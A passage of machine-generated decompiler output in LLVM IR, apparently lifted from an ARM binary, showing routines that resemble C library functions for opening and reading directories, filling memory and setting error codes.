  ret i32 %v0_107ec

; uselistorder directives
  uselistorder i32 %v2_10790, { 1, 0, 2 }
  uselistorder i32 %v0_10748, { 3, 2, 4, 0, 6, 5, 1, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 512, { 6, 3, 0, 4, 7, 5, 8, 1, 9, 2, 10 }
  uselistorder label %dec_label_pc_107ec, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_10804(i32 %arg1) local_unnamed_addr {
dec_label_pc_10804:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v6_10804 = load i32, i32* @r7, align 4
  %v2_1080c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_10834, label %dec_label_pc_10824

dec_label_pc_10824:                               ; preds = %dec_label_pc_10804
  %v0_10824 = call i32 @function_10a30()
  %v0_10828 = load i32, i32* @r7, align 4
  %v1_10828 = sub i32 0, %v0_10828
  %v2_1082c = inttoptr i32 %v0_10824 to i32*
  store i32 %v1_10828, i32* %v2_1082c, align 4
  br label %dec_label_pc_10858

dec_label_pc_10834:                               ; preds = %dec_label_pc_10804
  %v1_10834 = icmp slt i32 %arg1, 0
  br i1 %v1_10834, label %dec_label_pc_10858, label %dec_label_pc_1083c

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10834
  store i32 %v2_1080c, i32* @r1, align 4
  %v0_10840 = call i32 @function_13554()
  %v1_10844 = icmp slt i32 %v0_10840, 0
  br i1 %v1_10844, label %dec_label_pc_1084c, label %dec_label_pc_10860

dec_label_pc_1084c:                               ; preds = %dec_label_pc_1083c
  br label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_1084c, %dec_label_pc_10834, %dec_label_pc_10824
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1089c

dec_label_pc_10860:                               ; preds = %dec_label_pc_1083c
  %v0_10868 = load i32, i32* @r7, align 4
  %v3_1086c = call i32 @function_104a8(i32 %v0_10868, i32 2, i32 1)
  %v0_10870 = load i32, i32* @r7, align 4
  %v2_10878 = call i32 @function_10734(i32 %v0_10870, i32 %tmp)
  store i32 %v2_10878, i32* %r4.global-to-local, align 4
  %v2_1087c = icmp eq i32 %v2_10878, 0
  br i1 %v2_1087c, label %dec_label_pc_10884, label %dec_label_pc_1089c

dec_label_pc_10884:                               ; preds = %dec_label_pc_10860
  %v0_10890 = call i32 @function_10a30()
  %v2_10898 = inttoptr i32 %v0_10890 to i32*
  store i32 12, i32* %v2_10898, align 4
  %v0_1089c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1089c

dec_label_pc_1089c:                               ; preds = %dec_label_pc_10860, %dec_label_pc_10858, %dec_label_pc_10884
  %v0_1089c = phi i32 [ %v2_10878, %dec_label_pc_10860 ], [ 0, %dec_label_pc_10858 ], [ %v0_1089c.pre, %dec_label_pc_10884 ]
  store i32 %v6_10804, i32* @r7, align 4
  ret i32 %v0_1089c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1089c, { 2, 0, 1 }
}

define i32 @function_108ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_108ac:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_108ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_108ac, label %bb, label %dec_label_pc_108ac._crit_edge

dec_label_pc_108ac._crit_edge:                    ; preds = %dec_label_pc_108ac
  br label %bb11

bb:                                               ; preds = %dec_label_pc_108ac
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_108ac._crit_edge, %bb
  %v2_108b4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_108b4, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_108c0 = call i32 @function_13554()
  store i32 %v0_108c0, i32* @r5, align 4
  %v2_108c4 = icmp eq i32 %v0_108c0, 0
  br i1 %v2_108c4, label %dec_label_pc_108cc, label %dec_label_pc_10934

dec_label_pc_108cc:                               ; preds = %bb11
  %v1_108d0 = and i32 %tmp5, 61440
  store i32 %v1_108d0, i32* @r3, align 4
  %v7_108d4 = icmp eq i32 %v1_108d0, 16384
  br i1 %v7_108d4, label %dec_label_pc_108ec, label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108cc
  %v0_108dc = call i32 @function_10a30()
  br label %dec_label_pc_10918

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108cc
  %v0_108ec = load i32, i32* @r4, align 4
  %v2_108f4 = call i32 @function_1043c(i32 %v0_108ec, i32 3)
  %v7_108f8 = icmp eq i32 %v2_108f4, -1
  br i1 %v7_108f8, label %dec_label_pc_10934, label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %dec_label_pc_108ec
  %v1_10900 = urem i32 %v2_108f4, 4
  %v7_10904 = icmp eq i32 %v1_10900, 1
  br i1 %v7_10904, label %dec_label_pc_1090c, label %dec_label_pc_10920

dec_label_pc_1090c:                               ; preds = %dec_label_pc_10900
  %v0_1090c = call i32 @function_10a30()
  br label %dec_label_pc_10918

dec_label_pc_10918:                               ; preds = %dec_label_pc_108dc, %dec_label_pc_1090c
  %storemerge2 = phi i32 [ %v0_108dc, %dec_label_pc_108dc ], [ %v0_1090c, %dec_label_pc_1090c ]
  %storemerge = phi i32 [ 20, %dec_label_pc_108dc ], [ 22, %dec_label_pc_1090c ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_10918 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_10918, align 4
  %v0_10938.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10938

dec_label_pc_10920:                               ; preds = %dec_label_pc_10900
  %v0_10920 = load i32, i32* @r4, align 4
  %v2_10928 = call i32 @function_10734(i32 %v0_10920, i32 %tmp)
  store i32 %v2_10928, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10938

dec_label_pc_10934:                               ; preds = %bb11, %dec_label_pc_108ec
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10938

dec_label_pc_10938:                               ; preds = %dec_label_pc_10920, %dec_label_pc_10918, %dec_label_pc_10934
  %v0_10938 = phi i32 [ %v2_10928, %dec_label_pc_10920 ], [ %v0_10938.pre, %dec_label_pc_10918 ], [ 0, %dec_label_pc_10934 ]
  ret i32 %v0_10938

; uselistorder directives
  uselistorder i32 %v2_108f4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10734, { 1, 0 }
  uselistorder i32 ()* @function_13554, { 1, 0 }
  uselistorder label %dec_label_pc_10938, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10934, { 1, 0 }
  uselistorder label %dec_label_pc_10918, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_10948(i32* %arg1) local_unnamed_addr {
dec_label_pc_10948:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10948 = load i32, i32* @r4, align 4
  %v6_10948 = load i32, i32* @r5, align 4
  %v9_10948 = load i32, i32* @r6, align 4
  %v12_10948 = load i32, i32* @r7, align 4
  %v15_10948 = load i32, i32* @lr, align 4
  store i32 123764, i32* @r6, align 4
  %v1_1095c = add i32 %tmp, 24
  store i32 %v1_1095c, i32* @r4, align 4
  %v4_10960 = load i32, i32* inttoptr (i32 123800 to i32*), align 8
  store i32 %v4_10960, i32* %r1.global-to-local, align 4
  store i32 %v1_1095c, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_10974 = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10974)
  %v0_10988 = load i32, i32* @r6, align 4
  %v2_10988 = add i32 %v0_10988, 16
  %v3_10988 = inttoptr i32 %v2_10988 to i32*
  %v4_10988 = load i32, i32* %v3_10988, align 4
  store i32 %v4_10988, i32* @ip, align 4
  store i32 67988, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10988)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_10998

dec_label_pc_10998:                               ; preds = %dec_label_pc_109c8, %dec_label_pc_10948
  %v0_10998 = load i32, i32* @r5, align 4
  %v1_10998 = add i32 %v0_10998, 4
  %v2_10998 = inttoptr i32 %v1_10998 to i32*
  %v3_10998 = load i32, i32* %v2_10998, align 4
  store i32 %v3_10998, i32* %r2.global-to-local, align 4
  %v4_10998 = add i32 %v0_10998, 8
  %v5_10998 = inttoptr i32 %v4_10998 to i32*
  %v6_10998 = load i32, i32* %v5_10998, align 4
  %tmp10 = icmp ugt i32 %v6_10998, %v3_10998
  br i1 %tmp10, label %dec_label_pc_109c8, label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %dec_label_pc_10998
  %v1_109a4 = inttoptr i32 %v0_10998 to i32*
  %v2_109a4 = load i32, i32* %v1_109a4, align 4
  %v1_109a8 = add i32 %v0_10998, 12
  %v2_109a8 = inttoptr i32 %v1_109a8 to i32*
  %v3_109a8 = load i32, i32* %v2_109a8, align 4
  store i32 %v3_109a8, i32* %r1.global-to-local, align 4
  %v1_109ac = add i32 %v0_10998, 20
  %v2_109ac = inttoptr i32 %v1_109ac to i32*
  %v3_109ac = load i32, i32* %v2_109ac, align 4
  store i32 %v3_109ac, i32* %r2.global-to-local, align 4
  %v4_109b0 = call i32 @function_134c0(i32 %v2_109a4, i32 %v3_109a8, i32 %v3_109ac, i32 %v6_10998)
  %tmp9 = icmp slt i32 %v4_109b0, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_109c0

.thread:                                          ; preds = %dec_label_pc_109a4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_109f4

dec_label_pc_109c0:                               ; preds = %dec_label_pc_109a4
  %v1_109c0 = load i32, i32* @r5, align 4
  %v2_109c0 = add i32 %v1_109c0, 8
  %v3_109c0 = inttoptr i32 %v2_109c0 to i32*
  store i32 %v4_109b0, i32* %v3_109c0, align 4
  %v0_109c4 = load i32, i32* @r7, align 4
  %v1_109c4 = load i32, i32* @r5, align 4
  %v2_109c4 = add i32 %v1_109c4, 4
  %v3_109c4 = inttoptr i32 %v2_109c4 to i32*
  store i32 %v0_109c4, i32* %v3_109c4, align 4
  %v0_109c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_109c8

dec_label_pc_109c8:                               ; preds = %dec_label_pc_10998, %dec_label_pc_109c0
  %v1_109d8 = phi i32 [ %v0_10998, %dec_label_pc_10998 ], [ %v0_109c8.pre, %dec_label_pc_109c0 ]
  %v1_109c8 = add i32 %v1_109d8, 4
  %v2_109c8 = inttoptr i32 %v1_109c8 to i32*
  %v3_109c8 = load i32, i32* %v2_109c8, align 4
  store i32 %v3_109c8, i32* %r2.global-to-local, align 4
  %v1_109cc = add i32 %v1_109d8, 12
  %v2_109cc = inttoptr i32 %v1_109cc to i32*
  %v3_109cc = load i32, i32* %v2_109cc, align 4
  store i32 %v3_109cc, i32* %r1.global-to-local, align 4
  %v2_109d0 = add i32 %v3_109cc, %v3_109c8
  store i32 %v2_109d0, i32* @r4, align 4
  %v1_109d4 = add i32 %v2_109d0, 4
  %v2_109d4 = inttoptr i32 %v1_109d4 to i32*
  %v3_109d4 = load i32, i32* %v2_109d4, align 4
  %v2_109d8 = add i32 %v1_109d8, 16
  %v3_109d8 = inttoptr i32 %v2_109d8 to i32*
  store i32 %v3_109d4, i32* %v3_109d8, align 4
  %v0_109dc = load i32, i32* @r4, align 4
  %v1_109dc = add i32 %v0_109dc, 8
  %v2_109dc = inttoptr i32 %v1_109dc to i16*
  %v3_109dc = load i16, i16* %v2_109dc, align 2
  %v4_109dc = zext i16 %v3_109dc to i32
  %v0_109e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_109e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_109e0 = add i32 %v1_109e0, %v0_109e0
  %v3_109e0 = inttoptr i32 %v2_109e0 to i32*
  %v4_109e0 = load i32, i32* %v3_109e0, align 4
  store i32 %v4_109e0, i32* %r1.global-to-local, align 4
  %v2_109e4 = add i32 %v0_109e0, %v4_109dc
  %v2_109e8 = icmp eq i32 %v4_109e0, 0
  %v1_109ec = load i32, i32* @r5, align 4
  %v2_109ec = add i32 %v1_109ec, 4
  %v3_109ec = inttoptr i32 %v2_109ec to i32*
  store i32 %v2_109e4, i32* %v3_109ec, align 4
  br i1 %v2_109e8, label %dec_label_pc_10998, label %dec_label_pc_109f4

dec_label_pc_109f4:                               ; preds = %dec_label_pc_109c8, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_10a00 = load i32, i32* @r6, align 4
  %v2_10a00 = add i32 %v0_10a00, 24
  %v3_10a00 = inttoptr i32 %v2_10a00 to i32*
  %v4_10a00 = load i32, i32* %v3_10a00, align 4
  call void @__pseudo_branch(i32 %v4_10a00)
  %v0_10a0c = load i32, i32* @r4, align 4
  store i32 %v3_10948, i32* @r4, align 4
  store i32 %v6_10948, i32* @r5, align 4
  store i32 %v9_10948, i32* @r6, align 4
  store i32 %v12_10948, i32* @r7, align 4
  store i32 %v15_10948, i32* @lr, align 4
  ret i32 %v0_10a0c

; uselistorder directives
  uselistorder i32 %v1_109d8, { 0, 2, 1 }
  uselistorder i32 %v6_10998, { 1, 0 }
  uselistorder i32 %v0_10998, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_109c8, { 1, 0 }
}

define i32 @function_10a20(i32 %arg1) local_unnamed_addr {
dec_label_pc_10a20:
  %v0_10a20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10a20, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10a20
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10a20, %bb
  %v10_10a2c = phi i32 [ %arg1, %dec_label_pc_10a20 ], [ 0, %bb ]
  ret i32 %v10_10a2c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_10a30() local_unnamed_addr {
dec_label_pc_10a30:
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_d934.368 to i32), i32 68160), i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_1e5ec.370 to i32)
}

define i32 @function_10a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10a4c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_10a50 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10a50, i32* @r0, align 4
  %v1_10a58 = call i32 @function_13930(i32 %v2_10a50)
  %v2_10a5c = load i32, i32* %stack_var_-24, align 4
  %v2_10a60 = add i32 %v2_10a5c, %tmp
  %v2_10a68 = mul i32 %v2_10a60, 10000
  %v1_10a6c = and i32 %v2_10a68, 2147483632
  ret i32 %v1_10a6c

; uselistorder directives
  uselistorder i32 %v2_10a50, { 1, 0 }
}

define i32 @function_10a80(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10a80:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10a84 = load i32, i32* @r2, align 4
  %v8_10a84 = icmp eq i32 %v0_10a84, 8
  store i1 %v8_10a84, i1* %cpsr_z.global-to-local, align 1
  %v5_10a88 = icmp slt i32 %v0_10a84, 8
  br i1 %v5_10a88, label %dec_label_pc_10ae8, label %dec_label_pc_10a8c

dec_label_pc_10a8c:                               ; preds = %dec_label_pc_10a80
  %v4_10a8c = mul i32 %arg2, 256
  %v5_10a8c = or i32 %v4_10a8c, %arg2
  %v4_10a90 = mul i32 %v5_10a8c, 65536
  %v5_10a90 = or i32 %v4_10a90, %v5_10a8c
  store i32 %v5_10a90, i32* %r1.global-to-local, align 4
  %v1_10a9457 = urem i32 %tmp, 4
  %v2_10a9458 = icmp eq i32 %v1_10a9457, 0
  store i1 %v2_10a9458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_10a9458, label %dec_label_pc_10aa4, label %bb

bb:                                               ; preds = %dec_label_pc_10a8c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_10a8c ]
  %v3_10a9859 = phi i32 [ %v6_10a98, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_10a8c ]
  %v4_10a98 = inttoptr i32 %v3_10a9859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_10a98, align 1
  %v5_10a98 = load i32, i32* @r3, align 4
  %v6_10a98 = add i32 %v5_10a98, 1
  store i32 %v6_10a98, i32* @r3, align 4
  %v0_10a9c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_10aa8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_10a9c.pr, label %dec_label_pc_10aa4, label %.thread

.thread:                                          ; preds = %bb
  %v2_10a9c = add i32 %v0_10aa8.pr.pre, -1
  store i32 %v2_10a9c, i32* @r2, align 4
  %v1_10a94 = urem i32 %v6_10a98, 4
  %v2_10a94 = icmp eq i32 %v1_10a94, 0
  store i1 %v2_10a94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a94, label %dec_label_pc_10aa4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_10a98.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_10a98.pre to i8
  br label %bb

dec_label_pc_10aa4:                               ; preds = %.thread, %bb, %dec_label_pc_10a8c
  %v0_10ab028 = phi i32 [ %tmp, %dec_label_pc_10a8c ], [ %v6_10a98, %bb ], [ %v6_10a98, %.thread ]
  %v0_10aa8.pr = phi i32 [ %v0_10a84, %dec_label_pc_10a8c ], [ %v0_10aa8.pr.pre, %bb ], [ %v2_10a9c, %.thread ]
  %v0_10aa4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10aa4, i32* @ip, align 4
  %v8_10aa810 = icmp eq i32 %v0_10aa8.pr, 8
  store i1 %v8_10aa810, i1* %cpsr_z.global-to-local, align 1
  %v5_10aac11 = icmp slt i32 %v0_10aa8.pr, 8
  br i1 %v5_10aac11, label %dec_label_pc_10ae8, label %dec_label_pc_10ab0.preheader

dec_label_pc_10ab0.preheader:                     ; preds = %dec_label_pc_10aa4
  %v1_10ab046 = inttoptr i32 %v0_10ab028 to i32*
  store i32 %v0_10aa4, i32* %v1_10ab046, align 4
  %v3_10ab047 = add i32 %v0_10ab028, 4
  %v4_10ab048 = inttoptr i32 %v3_10ab047 to i32*
  %v5_10ab049 = load i32, i32* @ip, align 4
  store i32 %v5_10ab049, i32* %v4_10ab048, align 4
  %v6_10ab050 = add i32 %v0_10ab028, 8
  store i32 %v6_10ab050, i32* @r3, align 4
  %v0_10ab451 = load i32, i32* @r2, align 4
  %v1_10ab452 = add i32 %v0_10ab451, -8
  store i32 %v1_10ab452, i32* %r2.global-to-local, align 4
  %v5_10abc53 = icmp slt i32 %v1_10ab452, 8
  br i1 %v5_10abc53, label %dec_label_pc_10ab0.dec_label_pc_10ae8.loopexit_crit_edge, label %dec_label_pc_10ac0

dec_label_pc_10ac0:                               ; preds = %dec_label_pc_10ab0.preheader, %dec_label_pc_10aa8.dec_label_pc_10ab0_crit_edge
  %v6_10ab055 = phi i32 [ %v6_10ab0, %dec_label_pc_10aa8.dec_label_pc_10ab0_crit_edge ], [ %v6_10ab050, %dec_label_pc_10ab0.preheader ]
  %v0_10ab054 = phi i32 [ %v12_10adc, %dec_label_pc_10aa8.dec_label_pc_10ab0_crit_edge ], [ %v0_10ab028, %dec_label_pc_10ab0.preheader ]
  %v1_10ac0 = inttoptr i32 %v6_10ab055 to i32*
  %v2_10ac0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10ac0, i32* %v1_10ac0, align 4
  %v3_10ac0 = add i32 %v0_10ab054, 12
  %v4_10ac0 = inttoptr i32 %v3_10ac0 to i32*
  %v5_10ac0 = load i32, i32* @ip, align 4
  store i32 %v5_10ac0, i32* %v4_10ac0, align 4
  %v6_10ac0 = add i32 %v0_10ab054, 16
  store i32 %v6_10ac0, i32* @r3, align 4
  %v0_10ac4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ac4 = add i32 %v0_10ac4, -8
  store i32 %v1_10ac4, i32* %r2.global-to-local, align 4
  %v5_10acc = icmp slt i32 %v1_10ac4, 8
  br i1 %v5_10acc, label %dec_label_pc_10ac0.dec_label_pc_10ae8.loopexit_crit_edge, label %dec_label_pc_10ad0

dec_label_pc_10ad0:                               ; preds = %dec_label_pc_10ac0
  %v1_10ad0 = inttoptr i32 %v6_10ac0 to i32*
  %v2_10ad0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10ad0, i32* %v1_10ad0, align 4
  %v3_10ad0 = add i32 %v0_10ab054, 20
  %v4_10ad0 = inttoptr i32 %v3_10ad0 to i32*
  %v5_10ad0 = load i32, i32* @ip, align 4
  store i32 %v5_10ad0, i32* %v4_10ad0, align 4
  %v6_10ad0 = add i32 %v0_10ab054, 24
  store i32 %v6_10ad0, i32* @r3, align 4
  %v0_10ad4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ad4 = add i32 %v0_10ad4, -8
  store i32 %v1_10ad4, i32* %r2.global-to-local, align 4
  %v5_10adc = icmp slt i32 %v1_10ad4, 8
  br i1 %v5_10adc, label %dec_label_pc_10ad0.dec_label_pc_10ae8.loopexit_crit_edge, label %dec_label_pc_10aa8

dec_label_pc_10aa8:                               ; preds = %dec_label_pc_10ad0
  %v7_10adc = inttoptr i32 %v6_10ad0 to i32*
  %v8_10adc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_10adc, i32* %v7_10adc, align 4
  %v9_10adc = add i32 %v0_10ab054, 28
  %v10_10adc = inttoptr i32 %v9_10adc to i32*
  %v11_10adc = load i32, i32* @ip, align 4
  store i32 %v11_10adc, i32* %v10_10adc, align 4
  %v12_10adc = add i32 %v0_10ab054, 32
  store i32 %v12_10adc, i32* @r3, align 4
  %v6_10ae0 = load i32, i32* %r2.global-to-local, align 4
  %v7_10ae0 = add i32 %v6_10ae0, -8
  store i32 %v7_10ae0, i32* %r2.global-to-local, align 4
  %v5_10aac = icmp slt i32 %v7_10ae0, 8
  br i1 %v5_10aac, label %dec_label_pc_10aa8.dec_label_pc_10ae8.loopexit_crit_edge, label %dec_label_pc_10aa8.dec_label_pc_10ab0_crit_edge

dec_label_pc_10aa8.dec_label_pc_10ab0_crit_edge:  ; preds = %dec_label_pc_10aa8
  %v2_10ab0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10ab0 = inttoptr i32 %v12_10adc to i32*
  store i32 %v2_10ab0.pre, i32* %v1_10ab0, align 4
  %v3_10ab0 = add i32 %v0_10ab054, 36
  %v4_10ab0 = inttoptr i32 %v3_10ab0 to i32*
  %v5_10ab0 = load i32, i32* @ip, align 4
  store i32 %v5_10ab0, i32* %v4_10ab0, align 4
  %v6_10ab0 = add i32 %v0_10ab054, 40
  store i32 %v6_10ab0, i32* @r3, align 4
  %v0_10ab4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ab4 = add i32 %v0_10ab4, -8
  store i32 %v1_10ab4, i32* %r2.global-to-local, align 4
  %v5_10abc = icmp slt i32 %v1_10ab4, 8
  br i1 %v5_10abc, label %dec_label_pc_10ab0.dec_label_pc_10ae8.loopexit_crit_edge, label %dec_label_pc_10ac0

dec_label_pc_10aa8.dec_label_pc_10ae8.loopexit_crit_edge: ; preds = %dec_label_pc_10aa8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ae8

dec_label_pc_10ab0.dec_label_pc_10ae8.loopexit_crit_edge: ; preds = %dec_label_pc_10aa8.dec_label_pc_10ab0_crit_edge, %dec_label_pc_10ab0.preheader
  %v1_10ab4.lcssa = phi i32 [ %v1_10ab452, %dec_label_pc_10ab0.preheader ], [ %v1_10ab4, %dec_label_pc_10aa8.dec_label_pc_10ab0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ae8

dec_label_pc_10ac0.dec_label_pc_10ae8.loopexit_crit_edge: ; preds = %dec_label_pc_10ac0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ae8

dec_label_pc_10ad0.dec_label_pc_10ae8.loopexit_crit_edge: ; preds = %dec_label_pc_10ad0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ae8

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10aa4, %dec_label_pc_10aa8.dec_label_pc_10ae8.loopexit_crit_edge, %dec_label_pc_10ab0.dec_label_pc_10ae8.loopexit_crit_edge, %dec_label_pc_10ac0.dec_label_pc_10ae8.loopexit_crit_edge, %dec_label_pc_10ad0.dec_label_pc_10ae8.loopexit_crit_edge, %dec_label_pc_10a80
  %v0_10af0 = phi i32 [ %v0_10a84, %dec_label_pc_10a80 ], [ %v1_10ad4, %dec_label_pc_10ad0.dec_label_pc_10ae8.loopexit_crit_edge ], [ %v1_10ac4, %dec_label_pc_10ac0.dec_label_pc_10ae8.loopexit_crit_edge ], [ %v1_10ab4.lcssa, %dec_label_pc_10ab0.dec_label_pc_10ae8.loopexit_crit_edge ], [ %v7_10ae0, %dec_label_pc_10aa8.dec_label_pc_10ae8.loopexit_crit_edge ], [ %v0_10aa8.pr, %dec_label_pc_10aa4 ]
  %v2_10ae8 = icmp eq i32 %v0_10af0, 0
  store i1 %v2_10ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ae8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_10ae8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_10ae8
  %v1_10af0 = sub i32 7, %v0_10af0
  store i32 %v1_10af0, i32* %r2.global-to-local, align 4
  %v3_10af4 = mul i32 %v1_10af0, 4
  %v4_10af4 = add i32 %v3_10af4, ptrtoint (i32* @global_var_10afc.372 to i32)
  call void @__pseudo_branch(i32 %v4_10af4)
  %v0_10afc = load i32, i32* %r1.global-to-local, align 4
  %v1_10afc = trunc i32 %v0_10afc to i8
  %v2_10afc = load i32, i32* @r3, align 4
  %v3_10afc = inttoptr i32 %v2_10afc to i8*
  store i8 %v1_10afc, i8* %v3_10afc, align 1
  %v4_10afc = load i32, i32* @r3, align 4
  %v5_10afc = add i32 %v4_10afc, 1
  store i32 %v5_10afc, i32* %r3.global-to-local, align 4
  %v0_10b00 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b00 = trunc i32 %v0_10b00 to i8
  %v3_10b00 = inttoptr i32 %v5_10afc to i8*
  store i8 %v1_10b00, i8* %v3_10b00, align 1
  %v4_10b00 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b00 = add i32 %v4_10b00, 1
  store i32 %v5_10b00, i32* %r3.global-to-local, align 4
  %v0_10b04 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b04 = trunc i32 %v0_10b04 to i8
  %v3_10b04 = inttoptr i32 %v5_10b00 to i8*
  store i8 %v1_10b04, i8* %v3_10b04, align 1
  %v4_10b04 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b04 = add i32 %v4_10b04, 1
  store i32 %v5_10b04, i32* %r3.global-to-local, align 4
  %v0_10b08 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b08 = trunc i32 %v0_10b08 to i8
  %v3_10b08 = inttoptr i32 %v5_10b04 to i8*
  store i8 %v1_10b08, i8* %v3_10b08, align 1
  %v4_10b08 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b08 = add i32 %v4_10b08, 1
  store i32 %v5_10b08, i32* %r3.global-to-local, align 4
  %v0_10b0c = load i32, i32* %r1.global-to-local, align 4
  %v1_10b0c = trunc i32 %v0_10b0c to i8
  %v3_10b0c = inttoptr i32 %v5_10b08 to i8*
  store i8 %v1_10b0c, i8* %v3_10b0c, align 1
  %v4_10b0c = load i32, i32* %r3.global-to-local, align 4
  %v5_10b0c = add i32 %v4_10b0c, 1
  store i32 %v5_10b0c, i32* %r3.global-to-local, align 4
  %v0_10b10 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b10 = trunc i32 %v0_10b10 to i8
  %v3_10b10 = inttoptr i32 %v5_10b0c to i8*
  store i8 %v1_10b10, i8* %v3_10b10, align 1
  %v4_10b10 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b10 = add i32 %v4_10b10, 1
  store i32 %v5_10b10, i32* %r3.global-to-local, align 4
  %v0_10b14 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b14 = trunc i32 %v0_10b14 to i8
  %v3_10b14 = inttoptr i32 %v5_10b10 to i8*
  store i8 %v1_10b14, i8* %v3_10b14, align 1
  %v4_10b14 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b14 = add i32 %v4_10b14, 1
  store i32 %v5_10b14, i32* @r3, align 4
